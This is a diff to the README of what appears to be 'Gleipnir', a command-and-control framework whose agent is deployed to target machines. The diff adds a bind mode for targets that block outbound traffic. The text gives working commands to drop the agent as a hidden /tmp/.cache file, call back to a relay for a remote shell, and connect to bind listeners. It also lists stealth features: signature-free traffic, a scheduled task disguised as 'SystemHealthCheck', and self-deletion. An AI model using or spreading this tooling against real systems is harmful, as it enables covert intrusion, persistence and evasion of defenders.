@@ -10,8 +10,9 @@ Two Rust binaries in one Cargo workspace:
   API for CLI/MCP integration, SOCKS5 proxy server. Auto-generates a self-signed TLS cert
   on startup. Starts automatically via `docker compose up`.
 - **Agent** (deployed to targets): reverse TCP/TLS connect with auto-reconnect and
-  exponential backoff, platform-aware command execution, chunked file transfer, SOCKS5
-  tunneling. Single static binary, cross-compiled per target.
+  exponential backoff, or bind mode for egress-filtered targets. Platform-aware command
+  execution, chunked file transfer, SOCKS5 tunneling. Single static binary, cross-compiled
+  per target.
 
 Communication uses a custom binary wire protocol (`0x504B524C` framing) over TCP or TLS.
 No HTTP, no protobuf, no recognizable protocol signatures.
@@ -40,6 +41,10 @@ Pre-compiled agent binaries are available in the toolbox at `/opt/gleipnir/agent
 
 ## Quick start
 
+### Reverse connect (default)
+
+Target connects out to the relay. Use when the target has outbound network access.
+
 ```bash
 # Relay starts with docker compose (default port 4444, auto TLS)
 docker compose up -d
@@ -51,6 +56,26 @@ pk shell exec mysession "chmod +x /tmp/.cache && /tmp/.cache -H 10.10.14.5 -p 44
 # Verify connection
 pk shell list
 pk shell exec mysession "whoami"
+```
+
+### Bind mode
+
+Relay connects TO the agent. Use when the target blocks outbound connections (egress filtering) but you have inbound access (VPN, pivot).
+
+```bash
+# On target: agent listens on port 8443
+./gleipnir-agent --bind -p 8443 --tls
+
+# From relay: connect to the bind agent
+gleipnir connect 10.129.x.x 8443 --tls
+
+# Or via HTTP API
+curl -X POST http://localhost:6666/api/connect \
+  -H 'Content-Type: application/json' \
+  -d '{"host":"10.129.x.x","port":8443,"tls":true}'
+
+# Session appears in the normal session list
+pk shell list
 ```
 
 ## CLI commands
@@ -74,6 +99,8 @@ pk shell exec mysession "whoami"
 ```
 -H, --host <hosts>         Callback host(s), comma-separated for fallback
 -p, --port <port>          Callback port (default: 4444)
+    --bind                 Listen for incoming connections (bind mode)
+    --bind-addr <addr>     Bind address for bind mode (default: 0.0.0.0)
     --tls                  Enable TLS (accepts any cert by default)
     --tls-ca <path>        CA cert for TLS verification
     --session-id <id>      Stable session ID (auto-generated if omitted)
@@ -86,6 +113,10 @@ pk shell exec mysession "whoami"
     --task-name <name>     Windows scheduled task name (default: SystemHealthCheck)
     --self-delete          Delete the binary from disk after loading
 ```
+
+In bind mode, `--host` is not required. The agent listens on `--bind-addr`:`--port` and
+waits for the relay to connect. With `--tls`, the agent generates a self-signed certificate
+automatically.
 
 ## Persistence
 
